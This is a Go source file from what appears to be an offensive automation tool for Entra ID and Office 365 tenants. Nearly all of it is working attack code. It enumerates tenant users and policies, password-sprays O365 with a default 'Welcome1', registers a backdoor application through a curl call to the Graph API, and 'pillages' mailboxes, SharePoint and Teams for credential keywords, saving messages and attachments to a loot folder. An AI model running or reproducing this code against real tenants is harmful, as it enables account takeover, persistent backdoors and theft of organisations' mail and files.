package modules

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

func RunCloudEnumeration(ctx context.Context, state *core.ADState, tenant, username, password string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if state == nil {
		slog.Warn("nil state — skipping cloud enumeration")
		return result
	}

	utils.Section("☁️", "Cloud Enumeration", "Entra ID tenant reconnaissance")

	if tenant == "" {
		slog.Warn("no tenant specified — attempting to derive from creds")
		for _, c := range state.Creds {
			if c.Domain != "" {
				tenant = c.Domain
				break
			}
		}
		if tenant == "" {
			slog.Warn("no tenant available — skipping cloud enumeration")
			return result
		}
	}

	hasTokens := false
	for _, t := range state.Tokens {
		if t.Type == "access" && t.Resource == "MSGraph" {
			hasTokens = true
			break
		}
	}

	if hasTokens {
		enumerateWithGraphRunner(ctx, state, result)
	} else if username != "" && password != "" {
		enumerateWithAADInternals(ctx, state, result, tenant, username, password)
	} else {
		slog.Warn("no tokens or credentials available — skipping cloud enumeration")
		return result
	}

	state.Phases[core.PhaseCloudEnum] = core.PhaseComplete
	slog.Info("cloud enumeration complete", "resources", len(state.CloudResources))
	if len(state.CloudResources) > 0 {
		utils.StepOk(fmt.Sprintf("Discovered %d cloud resources", len(state.CloudResources)))
	} else {
		utils.StepWarn("No cloud resources discovered")
	}
	return result
}

func enumerateWithGraphRunner(ctx context.Context, state *core.ADState, result *core.ToolResult) {
	if !tools.GraphRunner.Available() {
		slog.Warn("GraphRunner not available — skipping Graph API enumeration")
		return
	}

	graphTokens := tokensToGraphTokens(state.Tokens)
	if graphTokens == nil {
		slog.Warn("no valid Graph tokens found in state")
		return
	}

	slog.Info("enumerating Entra ID via GraphRunner")

	if cr, err := tools.GraphRunner.RunUserEnum(ctx, graphTokens); err == nil {
		n := parseJSONResources(cr.Stdout, "user", result, state, "GraphRunner")
		slog.Info("GraphRunner: discovered users", "count", n)
	} else {
		slog.Warn("GraphRunner user enumeration failed", "error", err)
	}

	if cr, err := tools.GraphRunner.RunGroupEnum(ctx, graphTokens); err == nil {
		n := parseJSONResources(cr.Stdout, "group", result, state, "GraphRunner")
		slog.Info("GraphRunner: discovered groups", "count", n)
	} else {
		slog.Warn("GraphRunner group enumeration failed", "error", err)
	}

	if cr, err := tools.GraphRunner.RunAppEnum(ctx, graphTokens); err == nil {
		n := parseJSONResources(cr.Stdout, "app", result, state, "GraphRunner")
		slog.Info("GraphRunner: discovered apps", "count", n)
	} else {
		slog.Warn("GraphRunner app enumeration failed", "error", err)
	}

	if cr, err := tools.GraphRunner.RunCAPEnum(ctx, graphTokens); err == nil {
		n := parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "GraphRunner")
		slog.Info("GraphRunner: discovered CAPs", "count", n)
	} else {
		slog.Warn("GraphRunner CAP enumeration failed", "error", err)
	}
}

func tokensToGraphTokens(tokens []core.Token) *tools.GraphTokens {
	for _, t := range tokens {
		if t.Type == "access" && t.Secret != "" {
			gt := &tools.GraphTokens{
				AccessToken: t.Secret,
				TenantID:    t.Tenant,
			}
			for _, rt := range tokens {
				if rt.Type == "refresh" && rt.Resource == t.Resource {
					gt.RefreshToken = rt.Secret
					break
				}
			}
			return gt
		}
	}
	return nil
}

func enumerateWithAADInternals(ctx context.Context, state *core.ADState, result *core.ToolResult, tenant, username, password string) {
	if !tools.AADInternals.Available() {
		slog.Warn("AADInternals not available — install with: Install-Module AADInternals")
		return
	}

	slog.Info("enumerating Entra ID via AADInternals")

	if cr, err := tools.AADInternals.RunTenantEnum(ctx, username, password); err == nil {
		n := parseJSONResources(cr.Stdout, "user", result, state, "AADInternals")
		slog.Info("AADInternals: discovered users", "count", n)
	} else {
		slog.Warn("AADInternals tenant enumeration failed", "error", err)
	}

	if cr, err := tools.AADInternals.RunSPEnum(ctx, username, password); err == nil {
		n := parseJSONResources(cr.Stdout, "service_principal", result, state, "AADInternals")
		slog.Info("AADInternals: discovered service principals", "count", n)
	} else {
		slog.Warn("AADInternals service principal enumeration failed", "error", err)
	}

	if cr, err := tools.AADInternals.RunCAPEnum(ctx, username, password); err == nil {
		n := parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "AADInternals")
		slog.Info("AADInternals: discovered conditional access policies", "count", n)
	} else {
		slog.Warn("AADInternals CAP enumeration failed", "error", err)
	}
}

func parseJSONResources(stdout string, resType string, result *core.ToolResult, state *core.ADState, toolName string) int {
	lines := strings.Split(stdout, "\n")
	count := 0
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}

		var raw map[string]any
		if err := json.Unmarshal([]byte(trimmed), &raw); err != nil {
			continue
		}

		name, _ := raw["displayName"].(string)
		if name == "" {
			if v, ok := raw["userPrincipalName"].(string); ok {
				name = v
			}
		}
		if name == "" {
			if v, ok := raw["appId"].(string); ok {
				name = v
			}
		}
		if name == "" {
			continue
		}

		props, _ := json.Marshal(raw)

		cres := core.CloudResource{
			Type:         resType,
			Name:         name,
			Tenant:       "",
			Properties:   string(props),
			DiscoveredBy: toolName,
		}
		if oid, ok := raw["id"].(string); ok {
			cres.ObjectID = oid
		}
		if upn, ok := raw["userPrincipalName"].(string); ok && cres.ObjectID == "" {
			cres.ObjectID = upn
		}

		state.CloudResources = append(state.CloudResources, cres)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type:       core.EvUserEnumerated,
			Phase:      core.PhaseCloudEnum,
			Source:     toolName,
			Key:        cres.Type + ":" + cres.Name,
			Value:      fmt.Sprintf("discovered %s: %s", cres.Type, cres.Name),
			Confidence: 0.8,
			Timestamp:  time.Now(),
		})
		count++
	}
	return count
}

func RunCloudCredentialAcquisition(ctx context.Context, state *core.ADState, tenant, userlist, password string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if state == nil {
		slog.Warn("nil state — skipping cloud credential acquisition")
		return result
	}

	utils.Section("🔐", "Cloud Credential Acquisition", "O365 password spraying")

	if !tools.O365spray.Available() {
		slog.Warn("o365spray not available — install with: pipx install o365spray")
		return result
	}

	if tenant == "" {
		slog.Warn("no tenant specified — attempting to derive from state")
		for _, c := range state.Creds {
			if c.Domain != "" {
				tenant = c.Domain
				break
			}
		}
		if tenant == "" {
			for _, t := range state.Tokens {
				if t.Tenant != "" {
					tenant = t.Tenant
					break
				}
			}
		}
	}
	if tenant == "" {
		slog.Warn("no tenant available — skipping cloud credential acquisition")
		return result
	}

	if userlist == "" {
		slog.Warn("no userlist provided — generating from state users")
		tmpFile := filepath.Join(os.TempDir(), "adpack_o365_userlist.txt")
		var users []string
		for _, u := range state.Users {
			if u.Username != "" {
				users = append(users, u.Username)
			}
		}
		if len(users) == 0 {
			slog.Warn("no users in state to spray — skipping")
			return result
		}
		content := strings.Join(users, "\n")
		if err := os.WriteFile(tmpFile, []byte(content), 0600); err != nil {
			slog.Error("failed to write temp userlist", "error", err)
			return result
		}
		userlist = tmpFile
	}

	if password == "" {
		password = "Welcome1"
	}

	slog.Info("cloud cred-acq: password spraying O365", "tenant", tenant, "password", "[REDACTED]", "userlist", userlist)
	utils.Attempt("🔐", tenant, "password spraying O365")
	cr, err := tools.O365spray.RunSpray(ctx, tenant, userlist, password)
	if err != nil {
		slog.Error("cloud cred-acq: o365spray failed", "error", err)
		result.Success = false
		result.RawOutput = cr.Stdout
		return result
	}

	slog.Info("cloud cred-acq: o365spray completed, parsing results")
	result.RawOutput = cr.Stdout
	lines := strings.Split(cr.Stdout, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "[+]") || strings.Contains(trimmed, "VALID") {
			slog.Warn("cloud cred-acq: valid credential found", "detail", trimmed)
			fields := strings.Fields(trimmed)
			var sprayUser, sprayPass string
			for i, f := range fields {
				if strings.Contains(f, "@") || strings.Contains(f, "\\") {
					sprayUser = strings.TrimRight(f, ":;,")
				}
				if i > 0 && strings.Contains(f, password) {
					sprayPass = f
				}
			}
			if sprayUser != "" {
				domain := tenant
				uname := sprayUser
				if idx := strings.LastIndex(sprayUser, "@"); idx > 0 {
					domain = sprayUser[idx+1:]
					uname = sprayUser[:idx]
				} else if idx := strings.LastIndex(sprayUser, "\\"); idx > 0 {
					domain = sprayUser[:idx]
					uname = sprayUser[idx+1:]
				}
				cred := core.Credential{
					Type:     core.CredPlaintext,
					Username: uname,
					Domain:   domain,
					Secret:   sprayPass,
					Target:   tenant,
					Source:   "o365spray",
				}
				if sprayPass == "" {
					cred.Secret = password
				}
				state.Creds = append(state.Creds, cred)
				result.Creds = append(result.Creds, cred)
			}
		}
	}

	state.Phases[core.PhaseCloudCredAcq] = core.PhaseComplete
	slog.Info("cloud credential acquisition complete", "creds_found", len(result.Creds))
	if len(result.Creds) > 0 {
		utils.StepOk(fmt.Sprintf("Cloud spray: %d credential(s) obtained", len(result.Creds)))
	} else {
		utils.StepWarn("No cloud credentials found via spraying")
	}
	return result
}

func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if state == nil {
		slog.Warn("nil state — skipping cloud privesc analysis")
		return result
	}

	utils.Section("⬆️", "Cloud Privilege Escalation", "analyzing Azure role assignments")
	slog.Info("evaluating Azure role assignments and privilege escalation paths")

	if state == nil {
		return result
	}

	foundGA := false
	foundPRA := false
	foundAADConnect := false
	foundAppAdmin := false
	foundCloudAppAdmin := false

	for _, r := range state.CloudResources {
		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "global administrator") {
			foundGA = true
			slog.Warn("cloud privesc: global admin found", "resource", r.Name)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type:       core.EvPrivEscalated,
				Phase:      core.PhaseCloudPrivesc,
				Source:     "cloud_privesc",
				Key:        "global_admin:" + r.Name,
				Value:      "user has Global Administrator role",
				Confidence: 0.9,
				Timestamp:  time.Now(),
			})
		}
		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "privileged role administrator") {
			foundPRA = true
			slog.Warn("cloud privesc: privileged role admin found", "resource", r.Name)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type:       core.EvPrivEscalated,
				Phase:      core.PhaseCloudPrivesc,
				Source:     "cloud_privesc",
				Key:        "pra:" + r.Name,
				Value:      "user has Privileged Role Administrator role",
				Confidence: 0.9,
				Timestamp:  time.Now(),
			})
		}
		if r.Type == "user" && (strings.Contains(strings.ToLower(r.Properties), "application administrator") ||
			strings.HasPrefix(strings.ToLower(r.Properties), "app admin")) {
			foundAppAdmin = true
			slog.Warn("cloud privesc: application admin found — can register apps with broad OAuth permissions", "resource", r.Name)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhaseCloudPrivesc,
				Source: "cloud_privesc", Key: "app_admin:" + r.Name,
				Value:      "user has Application Administrator — can register apps with broad Graph permissions",
				Confidence: 0.9, Timestamp: time.Now(),
			})
		}
		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "cloud application administrator") {
			foundCloudAppAdmin = true
			slog.Warn("cloud privesc: cloud app admin found — can register apps with OAuth permissions", "resource", r.Name)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhaseCloudPrivesc,
				Source: "cloud_privesc", Key: "cloud_app_admin:" + r.Name,
				Value:      "user has Cloud Application Administrator — can register apps with broad Graph permissions",
				Confidence: 0.9, Timestamp: time.Now(),
			})
		}
		if r.Type == "app" && strings.Contains(strings.ToLower(r.Properties), "applicationimpersonation") {
			slog.Warn("cloud privesc: application impersonation found", "resource", r.Name)
		}
		if r.Type == "service_principal" && strings.Contains(strings.ToLower(r.Name), "aad connect") {
			foundAADConnect = true
			slog.Warn("cloud privesc: AAD Connect detected — potential hybrid privesc", "resource", r.Name)
		}
	}

	if foundGA {
		utils.Finding("Global Admin", "confirmed in tenant")
	}
	if foundPRA {
		utils.Finding("Privileged Role Admin", "can escalate to Global Admin")
	}
	if foundAppAdmin {
		utils.Finding("Application Admin", "can register apps with Graph permissions")
	}
	if foundCloudAppAdmin {
		utils.Finding("Cloud Application Admin", "can register apps with Graph permissions")
	}

	if foundGA {
		slog.Warn("cloud privesc: elevation paths available — Global Admin role present", "count", 1)
	} else {
		slog.Info("cloud privesc: no global admin detected in current resources")
	}
	if foundPRA {
		slog.Warn("cloud privesc: Privileged Role Administrator present — can elevate to GA")
	} else {
		slog.Info("cloud privesc: no privileged role admin detected")
	}
	if foundAppAdmin || foundCloudAppAdmin {
		attemptAppRegistrationAbuse(ctx, state, result)
	}
	if foundAADConnect {
		slog.Warn("cloud privesc: AAD Connect present — consider AADConnect credential extraction for on-prem pivot")
	}

	state.Phases[core.PhaseCloudPrivesc] = core.PhaseComplete
	slog.Info("cloud privesc analysis complete")
	if foundGA || foundPRA || foundAppAdmin || foundCloudAppAdmin {
		utils.StepOk("Cloud privilege escalation paths identified — review findings above")
	} else {
		utils.StepInfo("No cloud privilege escalation paths detected")
	}
	return result
}

func attemptAppRegistrationAbuse(ctx context.Context, state *core.ADState, result *core.ToolResult) {
	slog.Info("cloud privesc: attempting app registration abuse via Graph API")

	graphTokens := tokensToGraphTokens(state.Tokens)
	if graphTokens == nil {
		slog.Warn("cloud privesc: no Graph tokens — cannot register apps")
		return
	}

	appName := fmt.Sprintf("AdPackBackdoor_%d", time.Now().Unix())
	payload := `{"displayName":"` + appName + `","signInAudience":"AzureADMyOrg"}`
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -X POST -H "Authorization: Bearer %s" -H "Content-Type: application/json" -d '%s' 'https://graph.microsoft.com/v1.0/applications'`,
		graphTokens.AccessToken, payload,
	)})
	if !cr.Success {
		slog.Warn("cloud privesc: app registration failed", "error", cr.Stderr)
		utils.StepWarn(fmt.Sprintf("App registration failed: %s", cr.Stderr))
		return
	}

	var appResp map[string]any
	if err := json.Unmarshal([]byte(cr.Stdout), &appResp); err != nil {
		slog.Warn("cloud privesc: app response parse failed")
		return
	}

	appID, _ := appResp["appId"].(string)
	id, _ := appResp["id"].(string)
	slog.Warn("cloud privesc: app registered for backdoor access",
		"app_name", appName, "app_id", appID, "object_id", id)

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhaseCloudPrivesc,
		Source: "app_registration", Key: appName,
		Value:      fmt.Sprintf("app %s (%s) registered — add client secret and grant OAuth scopes for persistence", appName, appID),
		Confidence: 0.8, Timestamp: time.Now(),
	})

	credSecret := fmt.Sprintf("AppID=%s ObjectID=%s", appID, id)
	result.Creds = append(result.Creds, core.Credential{
		Type: core.CredPlaintext, Username: appName,
		Domain: "appreg", Secret: credSecret,
		Source: "app_registration_abuse", Validated: true,
	})

	slog.Warn("cloud privesc: next steps — add client secret via Graph API, then grant app OAuth scopes (Mail.Read, Files.Read.All, etc.)")
	utils.StepOk(fmt.Sprintf("App %s registered for backdoor access", appName))
}

func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if state == nil {
		slog.Warn("nil state — skipping cloud pillage")
		return result
	}

	utils.Section("📦", "Cloud Pillage", "mail, SharePoint, Teams data extraction")

	if !tools.GraphRunner.Available() {
		slog.Warn("GraphRunner not available — skipping cloud pillage")
		return result
	}

	graphTokens := tokensToGraphTokens(state.Tokens)
	if graphTokens == nil {
		slog.Warn("no valid Graph tokens found — skipping cloud pillage")
		return result
	}

	if len(searchTerms) == 0 {
		searchTerms = []string{"password", "secret", "credential", "token", "key", "admin"}
	}

	lootDir := LootDir
	if lootDir == "" {
		lootDir = filepath.Join(os.TempDir(), "adpack-cloud-pillage")
	}
	lootDir = filepath.Join(lootDir, fmt.Sprintf("pillage_%d", time.Now().Unix()))
	os.MkdirAll(lootDir, 0700)

	slog.Info("starting cloud pillage", "search_terms", searchTerms, "loot_dir", lootDir)

	downloads := 0

	for _, term := range searchTerms {
		slog.Info("cloud pillage: searching mailboxes", "term", term)
		if cr, err := tools.GraphRunner.RunMailboxSearch(ctx, graphTokens, term, 10); err == nil {
			lines := strings.Split(cr.Stdout, "\n")
			mailCount := 0
			for _, line := range lines {
				trimmed := strings.TrimSpace(line)
				if trimmed == "" {
					continue
				}
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type:       core.EvUserEnumerated,
					Phase:      core.PhaseCloudPillage,
					Source:     "GraphRunner_mailbox",
					Key:        term,
					Value:      trimmed,
					Confidence: 0.6,
					Timestamp:  time.Now(),
				})
				mailCount++

				var msg map[string]any
				if err := json.Unmarshal([]byte(trimmed), &msg); err == nil {
					if msgID, ok := msg["id"].(string); ok {
						msgDir := filepath.Join(lootDir, fmt.Sprintf("mail_%s", term))
						os.MkdirAll(msgDir, 0700)
						if export, err := tools.GraphRunner.RunMailMessageExport(ctx, graphTokens, "me", msgID); err == nil {
							exportPath := filepath.Join(msgDir, fmt.Sprintf("%s.json", msgID))
							os.WriteFile(exportPath, []byte(export.Stdout), 0600)
							downloads++
						}
						if att, err := tools.GraphRunner.RunMailAttachmentDownload(ctx, graphTokens, "me", term, 5); err == nil {
							attPath := filepath.Join(msgDir, "attachments.json")
							os.WriteFile(attPath, []byte(att.Stdout), 0600)
							downloads++
						}
					}
				}
			}
			slog.Info("cloud pillage: mailbox results", "term", term, "count", mailCount)
		} else {
			slog.Warn("cloud pillage: mailbox search failed", "term", term, "error", err)
		}

		slog.Info("cloud pillage: searching SharePoint/OneDrive", "term", term)
		if cr, err := tools.GraphRunner.RunSharePointSearch(ctx, graphTokens, term); err == nil {
			lines := strings.Split(cr.Stdout, "\n")
			spoCount := 0
			for _, line := range lines {
				trimmed := strings.TrimSpace(line)
				if trimmed == "" {
					continue
				}
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type:       core.EvUserEnumerated,
					Phase:      core.PhaseCloudPillage,
					Source:     "GraphRunner_sharepoint",
					Key:        term,
					Value:      trimmed,
					Confidence: 0.6,
					Timestamp:  time.Now(),
				})
				spoCount++
			}
			slog.Info("cloud pillage: SharePoint results", "term", term, "count", spoCount)
		} else {
			slog.Warn("cloud pillage: SharePoint search failed", "term", term, "error", err)
		}

		slog.Info("cloud pillage: searching Teams messages", "term", term)
		if cr, err := tools.GraphRunner.RunTeamsSearch(ctx, graphTokens, term); err == nil {
			lines := strings.Split(cr.Stdout, "\n")
			teamsCount := 0
			for _, line := range lines {
				trimmed := strings.TrimSpace(line)
				if trimmed == "" {
					continue
				}
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type:       core.EvUserEnumerated,
					Phase:      core.PhaseCloudPillage,
					Source:     "GraphRunner_teams",
					Key:        term,
					Value:      trimmed,
					Confidence: 0.6,
					Timestamp:  time.Now(),
				})
				teamsCount++
			}
			slog.Info("cloud pillage: Teams results", "term", term, "count", teamsCount)
		} else {
			slog.Warn("cloud pillage: Teams search failed", "term", term, "error", err)
		}
	}

	if downloads > 0 {
		slog.Info("cloud pillage: downloaded items", "count", downloads, "loot_dir", lootDir)
		utils.StepOk(fmt.Sprintf("Cloud pillage: %d item(s) downloaded to %s", downloads, lootDir))
	}

	state.Phases[core.PhaseCloudPillage] = core.PhaseComplete
	slog.Info("cloud pillage complete", "findings", len(result.Evidence))
	if downloads == 0 {
		utils.StepWarn("No cloud data exfiltrated")
	}
	return result
}
